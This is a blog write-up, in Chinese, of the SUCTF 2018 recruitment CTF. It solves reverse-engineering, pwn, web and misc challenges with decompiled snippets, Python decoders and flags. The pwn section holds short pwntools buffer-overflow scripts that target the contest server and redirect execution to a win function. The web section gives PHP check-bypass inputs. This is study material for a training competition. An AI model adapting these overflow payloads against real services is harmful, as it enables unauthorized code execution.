---
title: suctf招新赛2018-wp
date: 2018-11-15 00:00:00
categories: CTF
---

感觉挺有意思的

<!--more-->

# Rev

## basic re (814)

用 IDA 很容易扣出其中的逻辑，直接爆破就好啦。

逻辑的代码：

```cpp
#include <iostream>
using namespace std;
char array_table[180];
char flag_str[30];
int flag_single_data=0;
int single_array_data;
void payload_init(){
    array_table[0] = 2;
    array_table[1] = 3;
    array_table[2] = 2;
    array_table[3] = 1;
    array_table[4] = 4;
    array_table[5] = 7;
    array_table[6] = 4;
    array_table[7] = 5;
    array_table[8] = 10;
    array_table[9] = 11;
    array_table[10] = 10;
    array_table[11] = 9;
    array_table[12] = 14;
    array_table[13] = 15;
    array_table[14] = 12;
    array_table[15] = 13;
    array_table[16] = 16;
    array_table[17] = 19;
    array_table[18] = 16;
    array_table[19] = 17;
    array_table[20] = 20;
    array_table[21] = 23;
    array_table[22] = 22;
    array_table[23] = 19;
    array_table[24] = 28;
    array_table[25] = 25;
    array_table[26] = 30;
    array_table[27] = 31;
    array_table[28] = 28;
    array_table[29] = 25;
    array_table[30] = 26;
    array_table[31] = 31;
    array_table[32] = 36;
    array_table[33] = 33;
    array_table[34] = 34;
    array_table[35] = 39;
    array_table[36] = 36;
    array_table[37] = 33;
    array_table[38] = 34;
    array_table[39] = 35;
    array_table[40] = 40;
    array_table[41] = 41;
    array_table[42] = 46;
    array_table[43] = 43;
    array_table[44] = 36;
    array_table[45] = 45;
    array_table[46] = 38;
    array_table[47] = 47;
    array_table[48] = 56;
    array_table[49] = 49;
    array_table[50] = 58;
    array_table[51] = 59;
    array_table[52] = 52;
    array_table[53] = 61;
    array_table[54] = 62;
    array_table[55] = 55;
    array_table[56] = 48;
    array_table[57] = 57;
    array_table[58] = 50;
    array_table[59] = 59;
    array_table[60] = 60;
    array_table[61] = 53;
    array_table[62] = 54;
    array_table[63] = 55;
    array_table[64] = 72;
    array_table[65] = 73;
    array_table[66] = 66;
    array_table[67] = 66;
    array_table[68] = 68;
    array_table[69] = 68;
    array_table[70] = 70;
    array_table[71] = 71;
    array_table[72] = 72;
    array_table[73] = 73;
    array_table[74] = 74;
    array_table[75] = 74;
    array_table[76] = 77;
    array_table[77] = 77;
    array_table[78] = 79;
    array_table[79] = 78;
    array_table[80] = 80;
    array_table[81] = 80;
    array_table[82] = 82;
    array_table[83] = 83;
    array_table[84] = 85;
    array_table[85] = 84;
    array_table[86] = 86;
    array_table[87] = 87;
    array_table[88] = 89;
    array_table[89] = 89;
    array_table[90] = 90;
    array_table[91] = 91;
    array_table[92] = 92;
    array_table[93] = 93;
    array_table[94] = 94;
    array_table[95] = 94;
    array_table[96] = 96;
    array_table[97] = 96;
    array_table[98] = 99;
    array_table[99] = 99;
    array_table[100] = 100;
    array_table[101] = 101;
    array_table[102] = 103;
    array_table[103] = 103;
    array_table[104] = 105;
    array_table[105] = 105;
    array_table[106] = 107;
    array_table[107] = 107;
    array_table[108] = 108;
    array_table[109] = 109;
    array_table[110] = 110;
    array_table[111] = 110;
    array_table[112] = 112;
    array_table[113] = 112;
    array_table[114] = 114;
    array_table[115] = 115;
    array_table[116] = 116;
    array_table[117] = 117;
    array_table[118] = 119;
    array_table[119] = 119;
    array_table[120] = 120;
    array_table[121] = 121;
    array_table[122] = 123;
    array_table[123] = 123;
    array_table[124] = 125;
    array_table[125] = 125;
    array_table[126] = 127;
    array_table[127] = 127;
    array_table[128] = -127;
    array_table[129] = -127;
    array_table[130] = -125;
    array_table[131] = -125;
    array_table[132] = -116;
    array_table[133] = -115;
    array_table[134] = -114;
    array_table[135] = -113;
    array_table[136] = -120;
    array_table[137] = -119;
    array_table[138] = -118;
    array_table[139] = -117;
    array_table[140] = -116;
    array_table[141] = -115;
    array_table[142] = -114;
    array_table[143] = -121;
    array_table[144] = -104;
    array_table[145] = -111;
    array_table[146] = -110;
    array_table[147] = -109;
    array_table[148] = -108;
    array_table[149] = -107;
    array_table[150] = -106;
    array_table[151] = -105;
    array_table[152] = -104;
    array_table[153] = -103;
    array_table[154] = -102;
    array_table[155] = -102;
    array_table[156] = 0x9Cu;
    array_table[157] = -100;
    array_table[158] = -98;
    array_table[159] = -98;
    array_table[160] = -96;
    array_table[161] = -96;
    array_table[162] = -94;
    array_table[163] = -94;
    array_table[164] = -92;
    array_table[165] = -92;
    array_table[166] = -90;
    array_table[167] = -90;
    array_table[168] = -88;
    array_table[169] = -88;
    array_table[170] = -86;
    array_table[171] = -86;
    array_table[172] = -84;
    array_table[173] = -84;
    array_table[174] = -82;
    array_table[175] = -82;
    array_table[176] = -80;
    array_table[177] = -79;
    array_table[178] = -78;
    array_table[179] = -77;
}

int main()
{
    payload_init();
    int count = 8;
    int input_num=12345;
    input_num%=0x10000u;
    while(count){
        --count;
        for(int j=22;j;flag_str[j]|=flag_single_data<<count){
            single_array_data=array_table[22*count+--j];
            flag_single_data=(single_array_data>>((input_num>>2*count)&3))&1;
        }
    }
    cout<<flag_str<<endl;
}

```

可能运气还算不错，随便试了一个数就把 flag 爆出来了。

```
SUCTF{Flag_8i7244980f}
```

## re register (979)

这道题也很基础，直接扣逻辑就行了。

```python
stringl = 'RTBSEzEk`f^0bpdxndbm`pq628v|'

flag = ''

for i in range(len(stringl)):
    flag+=chr(ord(stringl[i])+1)

print(flag)
```

```
SUCTF{Flag_1cqeyoecnaqr739w}
```

## hash (991)

看到了这里：

```c
  v11 = 0x67452301;
  v12 = 0xEFCDAB89;
  v13 = 0x98BADCFE;
  v14 = 0x10325476;
```

大概能判断是 MD5。但是下面的字符串不能直接求解，发现前面还做了一个处理：

```c
  do
  {
    if ( !(v6 & 1) )
      v23[v6] ^= 1u;
    ++v6;
  }
  while ( v6 < 32 );
```

这个就用相同逻辑处理一下就好了：

```python
st_hash = 'bf772f6ed89838b9gb9f7abf3cc09413'
v6 = 0
st_md5 = ''
for i in range(32):
    if not(i&1):
        st_md5+=chr(ord(st_hash[i])^1)
        continue
    st_md5+=st_hash[i]

print(st_md5)
# cf673f7ee88828c9fb8f6acf2cb08403
```

丢到 cmd5 上发现是 `birthday` 。

然后发现后面还有一段比较的逻辑：

```c
  v1 = this;
  v2 = strlen(this);
  for ( i = 0; i < v2; *v4 += v5 + 1 )
  {
    v4 = &v1[i];
    v5 = 2 * i++;
  }
  v6 = strcmp(v1, "`ut9t;");
```

进行相应的逆向：

```python
str2 = '`ut9t;'
# str1 = ''
# def encode(sstrr):
#     for i in range(6):
#         v5 = 2*i
#         str1+=chr(ord(sstrr[i])+v5+1)

def decode(ssttrr):
    ret_str=''
    for i in range(len(ssttrr)):
        v5 = 2*i
        ret_str+=chr(ord(ssttrr[i])-v5-1)
    return ret_str

print(decode(str2))
# _ro2k0
```

得到 flag。

```
SUCTF{birthday_ro2k0}
```

## game (999)

这道题我们首先能意识到给的第一个字符串是 MD5，求解发现是 `nuaa` 。

这里要我们输入数字，而且要注意数字的存储方式。我们输入 `1633777006` 。这样第一关就过了。

第二关有什么操作呢？先进函数看看有UDRL，感觉是对迷宫进行操作。然后还有一个函数是从输入中每次取一byte然后从一个数组中选中方向。一共是28位。

第二关输入之前内存中有一个处理，利用之前的输入对迷宫初始化：

```c
    v2 = _mm_shuffle_epi32(_mm_cvtsi32_si128(v1), 0);
    v3 = (const __m128i *)&byte_404040;
    do
    {
      v4 = _mm_loadu_si128(v3);
      ++v3;
      _mm_storeu_si128((__m128i *)&v3[-1], _mm_xor_si128(v4, v2));
    }
    while ( (signed int)v3 < (signed int)aDurl );
```

到网上查了一下 mmx 系列函数的作用，就可以写出对应的解密函数了：

额，在那之前，我先将地图脱了出来进行了初始化。

```python
mazemap = [0x45, 0x5E, 0x4A, 0x4A, 0x2B, 0x5E, 0x4A, 0x4A, 0x45, 0x5E, 0x4A, 0x4A, 0x45, 0x5E, 0x41, 0x41,
           0x4E, 0x55, 0x41, 0x41, 0x4E, 0x55, 0x41, 0x41, 0x4E, 0x5E, 0x4A, 0x41, 0x45, 0x5E, 0x4A, 0x4A,
           0x45, 0x5E, 0x4A, 0x4A, 0x45, 0x55, 0x4A, 0x4A, 0x4E, 0x5E, 0x4A, 0x4A, 0x45, 0x5E, 0x4A, 0x4A,
           0x45, 0x5E, 0x41, 0x4A, 0x45, 0x5E, 0x41, 0x41, 0x4E, 0x55, 0x41, 0x41, 0x4E, 0x55, 0x41, 0x41,
           0x45, 0x5E, 0x4A, 0x4A, 0x45, 0x5E, 0x4A, 0x4A, 0x45, 0x5E, 0x4A, 0x4A, 0x4E, 0x5E, 0x4A, 0x41,
           0x45, 0x5E, 0x4A, 0x4A, 0x45, 0x5E, 0x4A, 0x4A, 0x45, 0x55, 0x4A, 0x4A, 0x4E, 0x5E, 0x4A, 0x4A,
           0x45, 0x5E, 0x4A, 0x4A, 0x45, 0x5E, 0x41, 0x4A, 0x45, 0x55, 0x4A, 0x4A, 0x45, 0x5E, 0x4A, 0x4A,
           0x45, 0x5E, 0x4A, 0x41, 0x45, 0x5E, 0x41, 0x4A, 0x45, 0x5E, 0x4A, 0x4A, 0x45, 0x5E, 0x4A, 0x4A,
           0x4E, 0x5E, 0x4A, 0x41, 0x45, 0x5E, 0x4A, 0x4A, 0x45, 0x5E, 0x4A, 0x4A, 0x45, 0x55, 0x4A, 0x4A,
           0x01, 0x55, 0x41, 0x41, 0x4E, 0x55, 0x41, 0x41, 0x4E, 0x55, 0x41, 0x4A, 0x45, 0x5E, 0x4A, 0x4A,
           0x45, 0x5E, 0x4A, 0x4A, 0x45, 0x5E, 0x4A, 0x4A, 0x45, 0x75, 0x61, 0x61, 0x2A, 0x20, 0x33, 0x2D,
           0x3B, 0xFE, 0x8D, 0xE2, 0x82, 0x2D, 0x32, 0x37, 0x39, 0xB3, 0x24, 0x8D, 0x2A, 0xB3, 0x24, 0x8C,
           0x1D, 0xB3, 0x24, 0x8F, 0x5D, 0xB3, 0x24, 0x8E, 0x1B, 0xB3, 0x24, 0x91, 0x59, 0xB3, 0x24, 0x90]
# nuaa = [0x61, 0x61, 0x75, 0x6e]
nuaa = [0x6e, 0x75, 0x61, 0x61]
for i in range(len(mazemap)):
    mazemap[i] = (mazemap[i]) ^ nuaa[i % 4]
output = ''
for i in range(len(mazemap)):
    # output += (str(hex(mazemap[i]))+' ')
    output += (chr(mazemap[i]))
    if i % 13 == 0:
        print(output)
        output = ''
```

结果得到：

```
+++E+++++++++
           ++
 +++++++++ ++
 +++++++++ ++
+          ++
++++++++++ ++
 +++++++++ ++
 +++++++++ ++
 +++++++++ ++
 +++++++++ ++
 +++++++++ ++
o          ++
++++++++++++
```

这个其实和初始的有点区别。。很明显脱得不算对，我猜测o是初始位置E是结束位置。这样就可以写出序列了：

```
RRRR RRRR RRUU UUUU UUUU LLLL LLLU
```

相关的输入为：

```
170 170 165 85 85 255 253
```

这样第二关也过了。

然后第三关可以发现他是解密了一个函数然后调用。

```c
  qmemcpy(v1, &byte_404117[1], 0320u); 位置
  puts("Wow...This is flag!");
  puts("Hey, I need check the flag is fake or not....");
  puts("try input flag:");
  LOBYTE(v3) = 0;
  *(_QWORD *)((char *)&v3 + 1) = 0i64;
  v4 = 0i64;
  v5 = 0i64;
  v6 = 0i64;
  scanf_s("%s", &v3, 19);
  if ( ((int (__cdecl *)(int *))v1)(&v3) )
    result = puts("Congratulation!");
```

我太菜了以至于只能用IDA的动态调试。

步入之后发现会有个这个：

```assembly
debug055:011C05C1 mov     byte ptr [ebp-14h], 'D'
debug055:011C05C5 mov     byte ptr [ebp-13h], 's'
debug055:011C05C9 mov     byte ptr [ebp-12h], '3'
debug055:011C05CD mov     byte ptr [ebp-11h], 'u'
debug055:011C05D1 mov     byte ptr [ebp-10h], '7'
debug055:011C05D5 mov     byte ptr [ebp-0Fh], 'w'
debug055:011C05D9 mov     byte ptr [ebp-0Eh], 'Y'
debug055:011C05DD mov     byte ptr [ebp-0Dh], 'N'
debug055:011C05E1 mov     byte ptr [ebp-0Ch], '{'
debug055:011C05E5 mov     byte ptr [ebp-0Bh], 'V'
debug055:011C05E9 mov     byte ptr [ebp-0Ah], 'y'
debug055:011C05ED mov     byte ptr [ebp-9], ';'
debug055:011C05F1 mov     byte ptr [ebp-8], 'S'
debug055:011C05F5 mov     byte ptr [ebp-7], '`'
debug055:011C05F9 mov     byte ptr [ebp-6], '='
debug055:011C05FD mov     byte ptr [ebp-5], '|'
debug055:011C0601 mov     byte ptr [ebp-4], 'c'
debug055:011C0605 mov     byte ptr [ebp-3], 'h'
debug055:011C0609 mov     dword ptr [ebp-18h], 0
debug055:011C0610 mov     dword ptr [ebp-18h], 0
```

在这里其实是可以 create_function 的，会得到这个：

```c
 v5 = 'D';
  v6 = 's';
  v7 = '3';
  v8 = 'u';
  v9 = '7';
  v10 = 'w';
  v11 = 'Y';
  v12 = 'N';
  v13 = '{';
  v14 = 'V';
  v15 = 'y';
  v16 = ';';
  v17 = 'S';
  v18 = '`';
  v19 = '=';
  v20 = '|';
  v21 = 'c';
  v22 = 'h';
  for ( i = 0; i < 18; ++i )
    a2[i] ^= i;
  for ( j = 0; j < 18; ++j )
  {
    if ( *(&v5 + j) != a2[j] )
      return 0;
  }
  return 1;
```

这就很清楚了。于是我们可以开始着手写decode函数了：

```python
arr = 'Ds3u7wYN{Vy;S`=|ch'
oou = ''
for i in range(len(arr)):
    oou += chr(ord(arr[i])^i)

print(oou)
#  Dr1v3r_Is_s0_m3ssy
```

于是得到 flag

```
flag{Dr1v3r_Is_s0_m3ssy}
```

# pwn

## stack (487)

简单的栈

payload:

```python
from pwn import *

next_door_addr = 0x400676

# p = process('./pwn')
p = remote('43.254.3.203',10003)

payload = 'a'*(0x20+8)+p64(next_door_addr)

p.sendline(payload)
p.interactive()
```

## basic pwn (559)

同上

```python
from pwn import *
# p = process('./basic_pwn')
p = remote('43.254.3.203',10004)
context.log_level="debug"
call_this_function_addr = 0x401157
payload = 'a'*(0x110+8)+p64(call_this_function_addr)
p.sendline(payload)
p.interactive()
```

## babyarray (774)

这道题甚至不需要任何工具。。

![](https://ws1.sinaimg.cn/large/79b6884egy1fx8xupppbjj20bl06x3yg.jpg)

## easy_overflow_file_structure (979)

先给出payload：

```python
from pwn import *

# p = process('./eofs')
p = remote('43.254.3.203', 10002)
secret_addr = 0x400F04
context.log_level = 'debug'


host_addr = 0x0602220
payload = 'GET / HTTP/1.1# '
payload += 'Host:'+p64(0xdeadbeef)+'a'*118+'#'
payload += 'Username:'+'b'*126+'#'
payload += 'ResearchField:' + 'c'*126 + '#'
payload += 'ResearchField:dd' + p64(host_addr)+ '#'


# payload += p64(secret_addr)
p.sendline(payload)
p.interactive()
# print(p32(0xdeadbeef))

p.close()

```

# web

## where are you from level1 (100)

用 

## include me (100)

貌似是个include函数的bug

## yunpan (100)

## onepiece (614)

## Easy_upload (627)

嗯他们上传完了之后我访问了他们的文件拿到了flag（

## php is No.1 (744)

首先构造 `num=[]` 绕过第一处，然后构造`time=2.6e6` 绕过第二处得到flag

```
SUCTF{pHp_1s_The_be5t}
```

# misc

## single dog (100)

用 binwalk 能看到里面还有个 zip。我用 foremost 把它切了出来。

里面的text是aaencode，到网上找个网站解码。

```javascript
function a()
{
var a="SUCTF{happy double eleven}";
alert("双十一快乐");
}
a();
```

## 佛家妙语 (700)

里面的佛语到网上解码是：

```
我是base中的大哥：5LqM5byf77yaNFM0SVRaTjRUN1RKM0pQRlNXVE83UEUySVUzRFFSUlpHQkNUT1FKVUlKQVRHUUpXR0kzRFNOWlVHWVpUTVJSV0lWQ1RTT0JYSEJDRUtOS0NJVTRUT05SU0dZWVRPTVpXR1VaVUNNWlRHVkFUR01KVEdRMlRBTlJaR1JDRE9OSlVHUVpUQ05SVkdVWVRNTUpXSVFaVE1OU0VHNFlUTVFKVkdVMkVHTVpVR1FZVEdOWldHUVpURU5CVkdRWkRPTlJWR1UzRENNWllHWTRET05SVUdVM0VFTVpV
```

然后base64解码得到：

```
二弟：4S4ITZN4T7TJ3JPFSWTO7PE2IU3DQRRZGBCTOQJUIJATGQJWGI3DSNZUGYZTMRRWIVCTSOBXHBCEKNKCIU4TONRSGYYTOMZWGUZUCMZTGVATGMJTGQ2TANRZGRCDONJUGQZTCNRVGUYTMMJWIQZTMNSEG4YTMQJVGU2EGMZUGQYTGNZWGQZTENBVGQZDONRVGU3DCMZYGY4DONRUGU3EEMZU
```

然后就可以在本机内base32

```python
print(str(base64.b32decode(sss), encoding="utf-8"))
```

得到：

```
三弟来啦：E68F90E7A4BA3A626974636F6EE9878DE5BE97626173653A335A313450694D7544316551616D366D716A554C34413764324542765561386876456B34
```

继续base16：

```python
print(str(base64.b16decode(ss2),encoding='utf-8'))

# 提示:bitcon重得base:3Z14PiMuD1eQam6mqjUL4A7d2EBvUa8hvEk4
```

是 bitcoin 吧。。到网上搜索到 base58，拖到某个网站上解密：

```
SUCTF{d0_y0u_kn0w_base58?}
```

## follow me (711)

这道题犯了和17年NUAA校赛中某道题一样的错误：

```bash
➜  follow_me git:(master) ✗ strings followme.pcapng | grep SUCTF
name=admin&password=SUCTF{password_is_not_weak}&referer=http%3A%2F%2F192.168.128.145%2Fbuild%2Fadmin%2F
```

## stature (814)

010修改高度

```
SUCTF{wo_cai_bu_ai}
```

## hidden (925)

用 binwalk 看一下发现里面有点东西。foremost解之。

里面有个 docx，改名为zip然后打开之，flag的后面可以得到：

```

```



## 人类的本质 (936)

## dead_z3r0 (951)

## 流量 (993)